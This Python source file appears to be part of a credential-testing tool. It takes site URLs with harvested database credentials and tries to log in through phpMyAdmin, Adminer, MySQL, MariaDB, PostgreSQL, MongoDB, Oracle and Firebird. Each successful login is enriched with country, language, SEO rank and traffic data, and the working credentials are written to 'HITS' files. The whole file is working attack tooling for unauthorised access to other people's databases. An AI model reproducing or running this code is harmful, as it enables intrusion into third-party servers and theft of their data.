import urllib.parse
import MySQLdb
import cx_Oracle
import firebirdsql
import mariadb
import psycopg2
from re import findall
from pymongo import MongoClient
import socket
import pycountry
from bs4 import BeautifulSoup as bs
import requests
from langdetect import detect
from time import sleep

highrange = range(66, 100)
midrange = range(33, 66)
lowrange = range(1, 33)
phpmyadmin_path = {"/phpmyadmin/index.php", "/PMA/index.php", "/myadmin/index.php", "/sqlmanager/index.php",
                   "/webdb/index.php", "/phpMyAdmin-2/index.php",
                   "/phpMyAdmin2/index.php", "/phpmyadmin2/index.php", "/pma/index.php",
                   "/phpMyAdmin/index.php", "/mysql-admin/index.php", "/mysqladmin/index.php",
                   "/myadmin/index.php"
                   }
adminer_pathlist = {"/adminer.php", "/adminer/adminer.php", "/admin/adminer.php"
                    }
headers = {'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                         '(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}


def alexa_ranking(url):
    global domain
    try:
        count_slashes = 0
        if url.startswith("http://") or url.startswith("https://"):
            for i in url.split("://")[1]:
                if i == "/":
                    count_slashes += 1
            if count_slashes >= 1:
                domain = url.split("://")[1].split("/")[0]
            elif count_slashes == 1:
                domain = url.split("://")[1].split("/")[0]
            elif count_slashes <= 1:
                domain = url
            else:
                domain = url
        elif "://" not in url:
            for i in url:
                if i == "/":
                    count_slashes += 1
            if count_slashes >= 1:
                domain = url.split("/")[0]
            elif count_slashes == 1:
                domain = url.split("/")[0]
            elif count_slashes <= 1:
                domain = url
            else:
                domain = url
        domain = domain.replace(":80", "").replace(":443", "").replace(":5000", "").replace(":8443", "").replace(
            ":8080", "").replace("http://", "").replace("https://", "").replace("www.", "")
        zoeken2 = requests.get('https://whoisdog.com/tool/domain-alexa-checker/index.php?action=alexa&d=' + domain).text
        url2 = zoeken2.replace('<font color="#FF0000"><strong>No Alexa</strong></font>', '-')
        if url2 == "-":
            alexa_rank = "N/A"
            return alexa_rank
        else:
            alexa_rank = url2
            return alexa_rank
    except:
        alexa_rank = "N/A"
        return alexa_rank


def seo(url):
    global d_auth, p_auth, mo, spam, domain
    count_slashes = 0
    if url.startswith("http://") or url.startswith("https://"):
        for i in url.split("://")[1]:
            if i == "/":
                count_slashes += 1
        if count_slashes >= 1:
            domain = url.split("://")[1].split("/")[0]
        elif count_slashes == 1:
            domain = url.split("://")[1].split("/")[0]
        elif count_slashes <= 1:
            domain = url
        else:
            domain = url
    elif "://" not in url:
        for i in url:
            if i == "/":
                count_slashes += 1
        if count_slashes >= 1:
            domain = url.split("/")[0]
        elif count_slashes == 1:
            domain = url.split("/")[0]
        elif count_slashes <= 1:
            domain = url
        else:
            domain = url
    domain = domain.replace(":80", "").replace(":443", "").replace(":5000", "").replace(":8443", "").replace(
        ":8080", "").replace("http://", "").replace("https://", "").replace("www.", "")
    data = {'url': f"{domain}", 'pa': '', 'mr': '', 'ss': '', 'go': 'submit'}
    try:
        zoeken = requests.post('http://v1.exploits.my.id:1337/?tools=dapa', data=data, verify=False).text
        pre = bs(zoeken, 'html.parser').find('pre')
        url = pre.text.replace("[~] Done", "").replace("[+] Loading ... ", "").replace("( 1 sites )", "").replace(
            "{} ".format(f"{domain}"), "").replace("Hadehentewkwk", "Error")
        d = url.split(" ")
        domain_auth = int(d[1])
        page_auth = int(d[3])
        mozr = int(d[5].split(".")[0])
        spamscore = int(d[7])
        if mozr == 0 and spamscore == 0 and domain_auth == 0:
            pass
        else:
            if domain_auth in range(66, 100):
                d_auth = domain_auth
            elif domain_auth in range(33, 66):
                d_auth = domain_auth
            elif domain_auth in range(0, 33):
                d_auth = domain_auth
            if page_auth in range(66, 100):
                p_auth = page_auth
            elif page_auth in range(33, 66):
                p_auth = page_auth
            elif page_auth in range(0, 33):
                p_auth = page_auth
            if mozr in range(6, 10):
                mo = mozr
            elif mozr in range(3, 6):
                mo = mozr
            elif mozr in range(0, 3):
                mo = mozr
            if spamscore in range(0, 33):
                spam = spamscore
            elif spamscore in range(33, 66):
                spam = spamscore
            elif spamscore in range(66, 100):
                spam = spamscore
            sturen = f"SEARCH_ENGINE_RANK: {d_auth} PAGE_AUTHORITY: {p_auth} MOZRANK: {mo} SPAMSCORE: {spam}"
            if domain_auth in range(66, 100) and page_auth in range(66, 100) and mozr in range(6, 10):
                domain_val = "HIGH_RANKED"
                return domain_val, sturen
            elif domain_auth in range(33, 66) and p_auth in range(33, 66) and mozr in range(3, 6):
                domain_val = "MID_RANKED"
                return domain_val, sturen
            elif domain_auth in range(0, 33) and page_auth in range(0, 33) and mozr in range(0, 3):
                domain_val = "LOW_RANKED"
                return domain_val, sturen
            else:
                domain_val = "NOT_EQUAL/NOT_RANKED"
                return domain_val, sturen
    except Exception as e:
        domain_val = "NOT/BAD_RANKED"
        return domain_val


def get(url):
    try:
        url = url.replace("\n", "").replace("\r", "").replace("http://", "").replace("https://", "").replace(":443",
                                                                                                             ""). \
            replace(":80", "")
        ip = socket.gethostbyname(url)
        response = requests.get(f"http://ip-api.com/json/{ip}", verify=False, allow_redirects=False, timeout=10)
        if response.status_code == 200:
            data = response.json()
            rg = data['countryCode']
            land = pycountry.countries.get(alpha_2=rg).name
            return land
        else:
            land = "N/A"
            return land
    except:
        land = "N/A"
        return land


def taal_pakken(star):
    try:
        zoek_taal = requests.get(star, allow_redirects=True, verify=False, headers=headers).content
        soup = bs(zoek_taal, "lxml")
        [s.decompose() for s in soup("script")]
        body_text = soup.body.get_text()
        echte_taal = str(detect(body_text)).upper()
        return echte_taal
    except:
        return "N/A"


def get_traffic(star):
    global unknown
    dataa = {"url": star,
             "go": "Gaskan"}
    try:
        sleep(5)
        get_traf = requests.post("http://v1.exploits.my.id:1337/?tools=traffic",
                                 allow_redirects=False, verify=False, data=dataa).text
        soup = bs(get_traf, "lxml")
        [s.decompose() for s in soup("script")]
        body_text = soup.body.get_text()
        nodig = str(body_text).strip().split("Monthly ")[1].replace("[+] Done ...", "").replace(
            "Unknown45 - 2021", "").replace("<", "LESS_THAN").replace(">", "MORE_THAN").replace(
            "VisitorsDaily Traffic : ", "DAILY_TRAFFIC: ").replace("Traffic : ", "MOTHLY_TRAFFIC: ").replace(
            "UnknownDaily", "Unknown").replace("UnknownDaily", "Unknown").replace("UnknownCountry",
                                                                                  "Unknown VisitorsCountry").split(
            "VisitorsCountry")[0]
        for word in nodig.split():
            unknown = 0
            if "Unknown" in str(word):
                unknown += 1
        if unknown > 0:
            return "N/A"
        return nodig
    except:
        return "N/A"


def phpmyadmin(url, method, db_connection, db_host, db_port, db_database, db_username, db_password):
    url = url.replace("'", "").replace('"', "").replace("\n", "").replace("\r", "").replace(" ", "")
    sqlquery = 'SELECT VERSION();'
    with requests.Session() as s:
        for pathen in phpmyadmin_path:
            try:
                iotokenurl = f'{url}{pathen}'
                gettoken = s.get(iotokenurl, timeout=10, verify=False, allow_redirects=True, headers=headers)
                if gettoken.status_code == 200:
                    if "PMA_commonParams.setAll" in gettoken.text or "CommonParams.setAll" in gettoken.text:
                        try:
                            gottoken = gettoken.text.split('name="token"')[1].split('"')[1]
                            loginpayload = dict(pma_username=db_username, pma_password=db_password, server='1',
                                                token=gottoken)
                            sendlogin = s.post(iotokenurl, data=loginpayload, allow_redirects=True, verify=False,
                                               headers=headers).text
                            if "Access denied " in sendlogin:
                                return "BAD_DATABASE"
                            token2 = sendlogin.split('name="token"')[1].split('"')[1]
                            my_referer = iotokenurl.replace("index.php", "")
                            s.headers.update({'referer': my_referer})
                            aftrlogin = dict(is_js_confirmed='0', token=token2, pos='1', goto='server_sql.php',
                                             message_to_show='Your+SQL+query+has+been+executed+successfully',
                                             prev_sql_query='',
                                             sql_query=sqlquery, sql_delimiter=';', show_query='1', ajax_request='true')
                            importurl = iotokenurl.replace("index.php", "import.php")
                            imported = s.post(importurl, data=aftrlogin, verify=False, headers=headers)
                            if str(imported.json()["success"]) == "true" or 'href="#Navi_tree"' in sendlogin:
                                try:
                                    country = get(url)
                                except:
                                    country = "N/A"
                                try:
                                    taal = taal_pakken(url)
                                except:
                                    taal = "N/A"
                                try:
                                    traffic = get_traffic(url)
                                except:
                                    traffic = "N/A"
                                try:
                                    get_info = seo(url)
                                    if get_info == "NOT/BAD_RANKED":
                                        dbs_val = "N/A"
                                        info = "N/A"
                                    else:
                                        try:
                                            dbs_val = get_info[0]
                                        except:
                                            dbs_val = "N/A"
                                        try:
                                            info = get_info[1]
                                        except:
                                            info = "N/A"
                                except:
                                    dbs_val = "N/A"
                                    info = "N/A"
                                build = 'URL: ' + str(iotokenurl) + '\nURL_LANGUAGE: ' + str(
                                    taal) + '\nDBS_COUNTRY: ' + str(
                                    country) + '\nDATABASE_RANK: ' + str(
                                    dbs_val) + '\nMETHOD: ' + str(method) + '\nDB_CONNECTION: ' + str(
                                    db_connection) + '\nDB_HOST: ' + str(
                                    db_host) + '\nDB_PORT: ' + str(db_port) + '\nDB_DATABASE: ' + str(
                                    db_database) + '\nDB_USERNAME: ' + str(
                                    db_username) + '\nDB_PASSWORD: ' + str(db_password) + '\nRANK_INFO: ' + str(
                                    info) + '\nDOMAIN_TRAFFIC: ' + str(traffic)
                                remover = str(build).replace('\r', '').replace('"', '').replace("'", "")
                                save = open('Results/DATABASES_PHPMYADMIN_HITS.txt', 'a')
                                save.write(remover + '\n\n')
                                save.close()
                                database_status = "PHPMYADMIN"
                                return database_status
                            else:
                                return "BAD_DATABASE"
                        except IndexError as e:
                            pass
                else:
                    pass
            except Exception as e:
                pass


def adminer_autologin(star, method, db_connection, db_host, db_port, db_database, db_username, db_password):
    try:
        star = star.replace("'", "").replace('"', "").replace("\n", "").replace("\r", "").replace(" ", "")
        sessie = requests.Session()
        host = star.split("://")[1].split(":")[0]
        for path in adminer_pathlist:
            url = star + path
            zoeken = sessie.get(f"{url}?username={db_username}")
            try:
                grab_version = findall('version=(.*?)">', zoeken.text)[0]
                cookie_sid = zoeken.cookies.get("adminer_sid")
                cookie_key = zoeken.cookies.get("adminer_key")
            except:
                return "BAD_DATABASE"
            if url.startswith("https://"):
                schem = "https"
            elif url.startswith("http://"):
                schem = "http"
            else:
                schem = "http"
            headers = {
                "authority": host,
                "method": "POST",
                "scheme": schem,
                "path": f"{path}",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,"
                          "application/signed-exchange;v=b3;q=0.9",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "nl,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
                "cache-control": "max-age=0",
                "content-length": "159",
                "content-type": "application/x-www-form-urlencoded",
                "cookie": f"adminer_key={cookie_key}; adminer_sid={cookie_sid}; adminer_permanent=; adminer_version={grab_version}",
                "origin": f"{star}",
                "referer": f"{url}",
                "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="102", "Microsoft Edge";v="102"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                              "Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.33 "
            }
            post_data = {"auth[driver]": "server",
                         "auth[server]": "",
                         "auth[username]": f"{db_username}",
                         "auth[password]": f"{db_password}",
                         "auth[db]": ""
                         }
            sessie.headers.update(headers)
            zoeken2 = sessie.post(f"{url}?username={db_username}", data=post_data, headers=headers)
            if "<title>Select database - Adminer</title>" in zoeken2.text:
                try:
                    country = get(star)
                except:
                    country = "N/A"
                try:
                    taal = taal_pakken(star)
                except:
                    taal = "N/A"
                try:
                    traffic = get_traffic(star)
                except:
                    traffic = "N/A"
                try:
                    get_info = seo(star)
                    if get_info == "NOT/BAD_RANKED":
                        dbs_val = "N/A"
                        info = "N/A"
                    else:
                        try:
                            dbs_val = get_info[0]
                        except:
                            dbs_val = "N/A"
                        try:
                            info = get_info[1]
                        except:
                            info = "N/A"
                except:
                    dbs_val = "N/A"
                    info = "N/A"
                build = 'URL: ' + str(url) + '\nURL_LANGUAGE: ' + str(
                    taal) + '\nDBS_COUNTRY: ' + str(
                    country) + '\nDATABASE_RANK: ' + str(
                    dbs_val) + '\nMETHOD: ' + str(method) + '\nDB_CONNECTION: ' + str(
                    db_connection) + '\nDB_HOST: ' + str(
                    db_host) + '\nDB_PORT: ' + str(db_port) + '\nDB_DATABASE: ' + str(
                    db_database) + '\nDB_USERNAME: ' + str(
                    db_username) + '\nDB_PASSWORD: ' + str(db_password) + '\nRANK_INFO: ' + str(
                    info) + '\nDOMAIN_TRAFFIC: ' + str(traffic)
                remover = str(build).replace('\r', '').replace('"', '').replace("'", "")
                save = open('Results/DATABASES_ADMINER_HITS.txt', 'a')
                save.write(remover + '\n\n')
                save.close()
                database_status = "ADMINER"
                return database_status
            else:
                return "BAD_DATABASE"
    except Exception as e:
        return "BAD_DATABASE"


def mysql(url, method, db_connection, db_host, db_port, db_database, db_username, db_password):
    global dbs_val, alexa, info
    try:
        conn = MySQLdb.Connect(host=db_host, user=db_username, password=db_password, port=int(db_port),
                               connect_timeout=5)
        cursor = conn.cursor()
        databases = ("show databases")
        cursor.execute(databases)
        database_count = 0
        for databases in cursor:
            for data in databases:
                database_count += 1
        try:
            country = get(url)
        except:
            country = "N/A"
        try:
            taal = taal_pakken(url)
        except:
            taal = "N/A"
        try:
            traffic = get_traffic(url)
        except:
            traffic = "N/A"
        try:
            get_info = seo(url)
            if get_info == "NOT/BAD_RANKED":
                dbs_val = "N/A"
                info = "N/A"
            else:
                try:
                    dbs_val = get_info[0]
                except:
                    dbs_val = "N/A"
                try:
                    info = get_info[1]
                except:
                    info = "N/A"
        except:
            dbs_val = "N/A"
            info = "N/A"
        build = 'URL: ' + str(url) + '\nURL_LANGUAGE: ' + str(taal) + '\nDBS_COUNTRY: ' + str(
            country) + '\nDATABASE_RANK: ' + str(
            dbs_val) + '\nMETHOD: ' + str(method) + '\nDB_CONNECTION: ' + str(db_connection) + '\nDB_HOST: ' + str(
            db_host) + '\nDB_PORT: ' + str(db_port) + '\nDB_DATABASE: ' + str(db_database) + '\nDB_USERNAME: ' + str(
            db_username) + '\nDB_PASSWORD: ' + str(db_password) + '\nDATABASE_COUNT: ' + str(
            database_count) + '\nRANK_INFO: ' + str(info) + '\nDOMAIN_TRAFFIC: ' + str(traffic)
        remover = str(build).replace('\r', '').replace('"', '').replace("'", "")
        save = open('Results/DATABASES_HITS.txt', 'a')
        save.write(remover + '\n\n')
        save.close()
        database_status = "MYSQL_DB"
        return database_status
    except Exception as e:
        database_status = "BAD_DATABASE"
        return database_status


def postgress(url, method, db_connection, db_host, db_port, db_database, db_username, db_password):
    global alexa
    try:
        psycopg2.connect(host=db_host, user=db_username, password=db_password, port=int(db_port), connect_timeout=5)
        try:
            country = get(url)
        except:
            country = "N/A"
        try:
            taal = taal_pakken(url)
        except:
            taal = "N/A"
        try:
            traffic = get_traffic(url)
        except:
            traffic = "N/A"
        try:
            get_info = seo(url)
            if get_info == "NOT/BAD_RANKED":
                dbs_val = "N/A"
                info = "N/A"
            else:
                try:
                    dbs_val = get_info[0]
                except:
                    dbs_val = "N/A"
                try:
                    info = get_info[1]
                except:
                    info = "N/A"
        except:
            dbs_val = "N/A"
            info = "N/A"
        build = 'URL: ' + str(url) + '\nURL_LANGUAGE: ' + str(taal) + '\nDBS_COUNTRY: ' + str(
            country) + '\nDATABASE_RANK: ' + str(
            dbs_val) + '\nMETHOD: ' + str(method) + '\nDB_CONNECTION: ' + str(db_connection) + '\nDB_HOST: ' + str(
            db_host) + '\nDB_PORT: ' + str(db_port) + '\nDB_DATABASE: ' + str(db_database) + '\nDB_USERNAME: ' + str(
            db_username) + '\nDB_PASSWORD: ' + str(db_password) + '\nRANK_INFO: ' + str(
            info) + '\nDOMAIN_TRAFFIC: ' + str(traffic)
        remover = str(build).replace('\r', '').replace('"', '').replace("'", "")
        save = open('Results/DATABASES_HITS.txt', 'a')
        save.write(remover + '\n\n')
        save.close()
        database_status = "POSTGRESS_SQL"
        return database_status
    except Exception as e:
        database_status = "BAD_DATABASE"
        return database_status


def mongodb(url, method, db_connection, db_host, db_port, db_database, db_username, db_password):
    global client, alexa
    try:
        username = urllib.parse.quote_plus(db_username)
        password = urllib.parse.quote_plus(db_password)
        conntion_string = (db_connection + "://" + username + ":" + password
                           + "@" + db_host + ":" + db_port + "/?connectTimeoutMS=5000")
        client = MongoClient(conntion_string)
        client.server_info()
        databases = client.list_database_names()
        database_count = 0
        for data in databases:
            database_count += 1
        try:
            country = get(url)
        except:
            country = "N/A"
        try:
            taal = taal_pakken(url)
        except:
            taal = "N/A"
        try:
            traffic = get_traffic(url)
        except:
            traffic = "N/A"
        try:
            get_info = seo(url)
            if get_info == "NOT/BAD_RANKED":
                dbs_val = "N/A"
                info = "N/A"
            else:
                try:
                    dbs_val = get_info[0]
                except:
                    dbs_val = "N/A"
                try:
                    info = get_info[1]
                except:
                    info = "N/A"
        except:
            dbs_val = "N/A"
            info = "N/A"
        build = 'URL: ' + str(url) + '\nURL_LANGUAGE: ' + str(taal) + '\nDBS_COUNTRY: ' + str(
            country) + '\nDATABASE_RANK: ' + str(
            dbs_val) + '\nMETHOD: ' + str(method) + '\nDB_CONNECTION: ' + str(db_connection) + '\nDB_HOST: ' + str(
            db_host) + '\nDB_PORT: ' + str(db_port) + '\nDB_DATABASE: ' + str(db_database) + '\nDB_USERNAME: ' + str(
            db_username) + '\nDB_PASSWORD: ' + str(db_password) + '\nDATABASE_COUNT: ' + str(
            database_count) + '\nRANK_INFO: ' + str(info) + '\nDOMAIN_TRAFFIC: ' + str(traffic)
        remover = str(build).replace('\r', '').replace('"', '').replace("'", "")
        save = open('Results/DATABASES_HITS.txt', 'a')
        save.write(remover + '\n\n')
        save.close()
        database_status = "MONGO_DB"
        return database_status
    except Exception as e:
        database_status = "BAD_DATABASE"
        return database_status


def check_mariadb(url, method, db_connection, db_host, db_port, db_database, db_username, db_password):
    global alexa
    try:
        mariadb.connect(host=db_host, user=db_username, password=db_password, port=int(db_port), connect_timeout=5)
        try:
            country = get(url)
        except:
            country = "N/A"
        try:
            taal = taal_pakken(url)
        except:
            taal = "N/A"
        try:
            traffic = get_traffic(url)
        except:
            traffic = "N/A"
        try:
            get_info = seo(url)
            if get_info == "NOT/BAD_RANKED":
                dbs_val = "N/A"
                info = "N/A"
            else:
                try:
                    dbs_val = get_info[0]
                except:
                    dbs_val = "N/A"
                try:
                    info = get_info[1]
                except:
                    info = "N/A"
        except:
            dbs_val = "N/A"
            info = "N/A"
        build = 'URL: ' + str(url) + '\nURL_LANGUAGE: ' + str(taal) + '\nDBS_COUNTRY: ' + str(
            country) + '\nDATABASE_RANK: ' + str(
            dbs_val) + '\nMETHOD: ' + str(method) + '\nDB_CONNECTION: ' + str(db_connection) + '\nDB_HOST: ' + str(
            db_host) + '\nDB_PORT: ' + str(db_port) + '\nDB_DATABASE: ' + str(db_database) + '\nDB_USERNAME: ' + str(
            db_username) + '\nDB_PASSWORD: ' + str(db_password) + '\nRANK_INFO: ' + str(
            info) + '\nDOMAIN_TRAFFIC: ' + str(traffic)
        remover = str(build).replace('\r', '').replace('"', '').replace("'", "")
        save = open('Results/DATABASES_HITS.txt', 'a')
        save.write(remover + '\n\n')
        save.close()
        database_status = "MARIA_DB"
        return database_status
    except Exception as e:
        database_status = "BAD_DATABASE"
        return database_status


def check_oracle(url, method, db_connection, db_host, db_port, db_database, db_username, db_password):
    global alexa
    try:
        dsn = db_host + '/pdborcl'
        encoding = 'UTF-8'
        cx_Oracle.connect(db_username, db_password, dsn, encoding=encoding)
        try:
            country = get(url)
        except:
            country = "N/A"
        try:
            taal = taal_pakken(url)
        except:
            taal = "N/A"
        try:
            traffic = get_traffic(url)
        except:
            traffic = "N/A"
        try:
            get_info = seo(url)
            if get_info == "NOT/BAD_RANKED":
                dbs_val = "N/A"
                info = "N/A"
            else:
                try:
                    dbs_val = get_info[0]
                except:
                    dbs_val = "N/A"
                try:
                    info = get_info[1]
                except:
                    info = "N/A"
        except:
            dbs_val = "N/A"
            info = "N/A"
        build = 'URL: ' + str(url) + '\nURL_LANGUAGE: ' + str(taal) + '\nDBS_COUNTRY: ' + str(
            country) + '\nDATABASE_RANK: ' + str(
            dbs_val) + '\nMETHOD: ' + str(method) + '\nDB_CONNECTION: ' + str(db_connection) + '\nDB_HOST: ' + str(
            db_host) + '\nDB_PORT: ' + str(db_port) + '\nDB_DATABASE: ' + str(db_database) + '\nDB_USERNAME: ' + str(
            db_username) + '\nDB_PASSWORD: ' + str(db_password) + '\nRANK_INFO: ' + str(
            info) + '\nDOMAIN_TRAFFIC: ' + str(traffic)
        remover = str(build).replace('\r', '').replace('"', '').replace("'", "")
        save = open('Results/DATABASES_HITS.txt', 'a')
        save.write(remover + '\n\n')
        save.close()
        database_status = "ORACLE_DB"
        return database_status
    except Exception as e:
        database_status = "BAD_DATABASE"
        return database_status


def check_firebird(url, method, db_connection, db_host, db_port, db_database, db_username, db_password):
    global alexa
    try:
        firebirdsql.connect(host=db_host, database=db_database, user=db_username, password=db_password,
                            port=int(db_port),
                            timeout=3)
        try:
            country = get(url)
        except:
            country = "N/A"
        try:
            taal = taal_pakken(url)
        except:
            taal = "N/A"
        try:
            traffic = get_traffic(url)
        except:
            traffic = "N/A"
        try:
            get_info = seo(url)
            if get_info == "NOT/BAD_RANKED":
                dbs_val = "N/A"
                info = "N/A"
            else:
                try:
                    dbs_val = get_info[0]
                except:
                    dbs_val = "N/A"
                try:
                    info = get_info[1]
                except:
                    info = "N/A"
        except:
            dbs_val = "N/A"
            info = "N/A"
        build = 'URL: ' + str(url) + '\nURL_LANGUAGE: ' + str(taal) + '\nDBS_COUNTRY: ' + str(
            country) + '\nDATABASE_RANK: ' + str(
            dbs_val) + '\nMETHOD: ' + str(method) + '\nDB_CONNECTION: ' + str(db_connection) + '\nDB_HOST: ' + str(
            db_host) + '\nDB_PORT: ' + str(db_port) + '\nDB_DATABASE: ' + str(db_database) + '\nDB_USERNAME: ' + str(
            db_username) + '\nDB_PASSWORD: ' + str(db_password) + '\nRANK_INFO: ' + str(
            info) + '\nDOMAIN_TRAFFIC: ' + str(traffic)
        remover = str(build).replace('\r', '').replace('"', '').replace("'", "")
        save = open('Results/DATABASES_HITS.txt', 'a')
        save.write(remover + '\n\n')
        save.close()
        database_status = "FIREBIRD_SQL"
        return database_status
    except Exception as e:
        database_status = "BAD_DATABASE"
        return database_status


def startum(url, method, db_connection, db_host, db_port, db_database, db_username, db_password):
    db_connection = db_connection.replace("\n", "").replace("\r", "").replace(" ", "")
    try:
        test_phpmyadmin = phpmyadmin(url, method, db_connection, db_host, db_port, db_database, db_username,
                                     db_password)
        if test_phpmyadmin == "PHPMYADMIN":
            database_status = test_phpmyadmin
            return database_status
        test_adminer = adminer_autologin(url, method, db_connection, db_host, db_port, db_database, db_username,
                                         db_password)
        if test_adminer == "ADMINER":
            database_status = test_adminer
            return database_status
        if db_connection == "mysql" or db_connection == "MySQLi" or db_connection == "MySQL" or "mysql" in db_connection:
            test_mysql = mysql(url, method, db_connection, db_host, db_port, db_database, db_username, db_password)
            if test_mysql == "MYSQL_DB":
                database_status = test_mysql
                return database_status
            else:
                test_mariadb = check_mariadb(url, method, db_connection, db_host, db_port, db_database, db_username,
                                             db_password)
                database_status = test_mariadb
                return database_status
        elif db_connection == "pgsql" or db_connection == "postgresql" or "postgress" in db_connection:
            test_postgress = postgress(url, method, db_connection, db_host, db_port, db_database, db_username,
                                       db_password)
            database_status = test_postgress
            return database_status
        elif db_connection == "mongodb" or "mongo" in db_connection:
            test_mongo = mongodb(url, method, db_connection, db_host, db_port, db_database, db_username,
                                 db_password)
            database_status = test_mongo
            return database_status
        elif db_connection == "mariadb" or "maria" in db_connection:
            test_mariadb = check_mariadb(url, method, db_connection, db_host, db_port, db_database, db_username,
                                         db_password)
            database_status = test_mariadb
            return database_status
        elif db_connection == "oracle":
            test_oracle = check_oracle(url, method, db_connection, db_host, db_port, db_database, db_username,
                                       db_password)
            database_status = test_oracle
            return database_status
        elif db_connection == "firebird":
            test_firebird = check_firebird(url, method, db_connection, db_host, db_port, db_database, db_username,
                                           db_password)
            database_status = test_firebird
            return database_status
        else:
            datbase_status = "BAD_DATABASE"
            return datbase_status
    except Exception as e:
        database_status = "BAD_DATABASE"
        return database_status
